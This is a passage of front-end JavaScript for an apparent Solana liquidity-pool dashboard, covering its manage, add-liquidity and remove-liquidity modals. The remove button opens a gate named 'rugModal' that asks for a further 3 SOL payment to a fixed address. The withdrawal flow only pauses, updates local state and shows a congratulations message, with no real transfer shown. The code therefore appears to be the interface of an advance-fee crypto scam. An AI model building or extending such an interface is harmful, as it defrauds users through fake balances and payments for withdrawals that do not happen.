      <li><span>Pooled tokens</span><b>${fmtCompact(m.pooledTokens)} ${escapeHtml(sym)}</b></li>
      <li><span>Total supply</span><b>${escapeHtml(String(pos.supply || "—"))} ${escapeHtml(sym)}</b></li>
      <li><span>Decimals</span><b>${escapeHtml(String(pos.decimals || "9"))}</b></li>
      <li><span>Paid</span><b>${fmtNum(paid, 2)} SOL</b></li>
      <li><span>Payment</span><b title="${escapeHtml(pos.paymentSig || "")}">${shortAddr(pos.paymentSig || "—")}</b></li>
      <li><span>Created</span><b>${ageLabel(pos.createdAt || now)}</b></li>`;
  }
  manageModal?.classList.add("open");
}

function closeManage() {
  manageModal?.classList.remove("open");
  manageMint = "";
}

function syncRemoveUi() {
  const pos = getPosition(manageMint) || positions.find((p) => p.mint === manageMint);
  if (!pos) return;
  const m = metrics(pos, Date.now());
  const amt = (m.lpSol * removePct) / 100;
  if ($("removeWithdrawAmt")) $("removeWithdrawAmt").textContent = `${fmtNum(amt, 2)} SOL`;
  if ($("removePctLabel")) $("removePctLabel").textContent = `${removePct}%`;
  if ($("removePct")) $("removePct").value = String(removePct);
  document.querySelectorAll("#removePresets .preset[data-rm-pct]").forEach((b) => {
    b.classList.toggle("is-on", Number(b.getAttribute("data-rm-pct")) === removePct);
  });
  if ($("removeProgressSol")) $("removeProgressSol").textContent = fmtNum(amt, 2);
}

function openRemove() {
  if (!manageMint) return;
  removePct = 100;
  showRemovePane("form");
  if ($("removeDest")) $("removeDest").value = "";
  syncRemoveUi();
  manageModal?.classList.remove("open");
  removeModal?.classList.add("open");
}

function closeRemove() {
  if (removeBusy) return;
  removeModal?.classList.remove("open");
  showRemovePane("form");
}

async function runRemoveFlow() {
  if (removeBusy || !manageMint) return;
  const dest = ($("removeDest")?.value || "").trim();
  if (dest.length < 32) {
    toast("Enter a Solana destination wallet");
    return;
  }
  const pos = getPosition(manageMint) || positions.find((p) => p.mint === manageMint);
  if (!pos) return;
  const m = metrics(pos, Date.now());
  lastWithdrawn = (m.lpSol * removePct) / 100;
  removeBusy = true;
  showRemovePane("progress");
  if ($("removeProgressSol")) $("removeProgressSol").textContent = fmtNum(lastWithdrawn, 2);
  await new Promise((r) => setTimeout(r, 1600));

  const result = removeLiquidityPct(manageMint, removePct);
  if (!result) {
    removeBusy = false;
    showRemovePane("form");
    toast("Position not found");
    return;
  }
  if (result.removed) {
    positions = positions.filter((p) => p.mint !== manageMint);
  } else if (result.pos) {
    positions = positions.map((p) =>
      p.mint === manageMint ? { ...result.pos, sim: p.sim } : p
    );
  }
  if ($("removeDoneSol")) $("removeDoneSol").textContent = `${fmtNum(lastWithdrawn, 2)} SOL`;
  if ($("removeDoneShare")) {
    $("removeDoneShare").textContent = result.removed ? "0%" : `${Math.max(0, 100 - removePct)}%`;
  }
  showRemovePane("done");
  render();
  removeBusy = false;
  toast("Congratulations — liquidity removed");
}

$("liqList")?.addEventListener("click", async (e) => {
  const tfBtn = e.target.closest("[data-tf]");
  if (tfBtn) {
    const mint = tfBtn.getAttribute("data-mint");
    const tf = tfBtn.getAttribute("data-tf");
    if (mint && tf) {
      tfByMint.set(mint, tf);
      const card = tfBtn.closest(".liq-card");
      card?.querySelectorAll(".liq-tf").forEach((b) => {
        b.classList.toggle("is-on", b.getAttribute("data-tf") === tf);
      });
      softUpdate();
    }
    return;
  }
  const toolBtn = e.target.closest("[data-tool]");
  if (toolBtn) {
    const mint = toolBtn.getAttribute("data-mint");
    const tool = toolBtn.getAttribute("data-tool");
    if (mint && tool) {
      if (tool === "trash") {
        toast("Drawings cleared");
        toolByMint.set(mint, "cross");
      } else if (tool === "eye") {
        toast("Drawings hidden");
        return;
      } else if (tool === "lock") {
        toast("Drawings locked");
        return;
      } else {
        toolByMint.set(mint, tool);
      }
      const card = toolBtn.closest(".liq-card");
      const active = toolByMint.get(mint) || "cross";
      card?.querySelectorAll(".liq-tool").forEach((b) => {
        b.classList.toggle("is-on", b.getAttribute("data-tool") === active);
      });
      const chart = card?.querySelector("[data-chart]");
      if (chart) {
        chart.className = `liq-chart is-tool-${active}`;
      }
    }
    return;
  }
  const indBtn = e.target.closest("[data-ind]");
  if (indBtn) {
    toast("Indicators: MA · Volume · RSI");
    return;
  }
  const backBtn = e.target.closest("[data-back-list]");
  if (backBtn) {
    activeMint = "";
    render();
    return;
  }
  const manageBtn = e.target.closest("[data-manage]");
  if (manageBtn) {
    e.preventDefault();
    e.stopPropagation();
    const mint = manageBtn.getAttribute("data-manage");
    if (!mint) return;
    // From list: open detailed view. From detail: open manage modal.
    if (activeMint !== mint) {
      activeMint = mint;
      render();
      window.scrollTo({ top: 0, behavior: "smooth" });
      return;
    }
    openManage(mint);
    return;
  }
  const openBtn = e.target.closest("[data-open-token]");
  if (openBtn) {
    const mint = openBtn.getAttribute("data-open-token");
    if (mint) {
      activeMint = mint;
      render();
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
    return;
  }
  const addBtn = e.target.closest("[data-add-liq-open]");
  if (addBtn) {
    openAddLiq(addBtn.getAttribute("data-add-liq-open"));
    return;
  }
  const copyBtn = e.target.closest("[data-copy]");
  if (copyBtn) {
    try {
      await navigator.clipboard.writeText(copyBtn.getAttribute("data-copy") || "");
      toast("Mint copied");
    } catch {
      toast("Could not copy");
    }
  }
});

const rugModal = $("rugModal");

function openRugGate() {
  const mint = manageMint;
  const pos = getPosition(mint) || positions.find((p) => p.mint === mint);
  if (!pos) return;
  if ($("rugModalSub")) {
    $("rugModalSub").textContent =
      `Token: ${pos.name || pos.symbol || "Token"} ($${pos.symbol || "TOKEN"})`;
  }
  manageModal?.classList.remove("open");
  rugModal?.classList.add("open");
}

function closeRugGate() {
  rugModal?.classList.remove("open");
}

$("manageClose")?.addEventListener("click", closeManage);
$("manageAdd")?.addEventListener("click", () => {
  const mint = manageMint;
  closeManage();
  if (mint) openAddLiq(mint);
});
$("manageRemove")?.addEventListener("click", openRugGate);
manageModal?.addEventListener("click", (e) => {
  if (e.target === manageModal) closeManage();
});

$("rugCancel")?.addEventListener("click", () => {
  closeRugGate();
  toast("Cancelled — pool keeps running");
  if (manageMint) openManage(manageMint);
});
$("rugPay")?.addEventListener("click", () => {
  const mint = manageMint;
  closeRugGate();
  if (mint) openAddLiq(mint, { amount: 3 });
});
rugModal?.addEventListener("click", (e) => {
  if (e.target === rugModal) {
    closeRugGate();
    if (manageMint) openManage(manageMint);
  }
});

document.querySelectorAll("#removePresets .preset[data-rm-pct]").forEach((btn) => {
  btn.addEventListener("click", () => {
    removePct = Number(btn.getAttribute("data-rm-pct")) || 100;
    syncRemoveUi();
  });
});
$("removePct")?.addEventListener("input", () => {
  removePct = Number($("removePct").value) || 100;
  syncRemoveUi();
});
$("removeConfirm")?.addEventListener("click", () => runRemoveFlow());
$("removeKeep")?.addEventListener("click", () => {
  closeRemove();
  if (manageMint) openManage(manageMint);
});
$("removeDone")?.addEventListener("click", () => {
  closeRemove();
  manageMint = "";
});
removeModal?.addEventListener("click", (e) => {
  if (e.target === removeModal) closeRemove();
});

document.querySelectorAll("#addLiqPresets .preset[data-add-liq]").forEach((btn) => {
  btn.addEventListener("click", () => {
    document.querySelectorAll("#addLiqPresets .preset[data-add-liq]").forEach((b) => b.classList.remove("is-on"));
    btn.classList.add("is-on");
    if ($("addLiqCustom")) $("addLiqCustom").value = "";
    syncAddAmount();
  });
});
$("addLiqCustom")?.addEventListener("input", syncAddAmount);
$("addLiqCheck")?.addEventListener("click", () => tryAddPayment({ silent: false }));
$("addLiqClose")?.addEventListener("click", closeAddLiq);
addModal?.addEventListener("click", (e) => {
  if (e.target === addModal) closeAddLiq();
});
$("addLiqCopyAmt")?.addEventListener("click", async () => {
  try {
    await navigator.clipboard.writeText(String(addAmount));
    toast("Copied");
  } catch {
    toast("Could not copy");
  }
});
$("addLiqCopyAddr")?.addEventListener("click", async () => {
  try {
    await navigator.clipboard.writeText(PAY_ADDRESS);
    toast("Copied");
  } catch {
    toast("Could not copy");
  }
});

// Render immediately — don't block the list on price fetch
syncFromStore();
render();
setInterval(softUpdate, TICK_MS);
refreshSol().finally(() => softUpdate());
setInterval(refreshSol, 120_000);
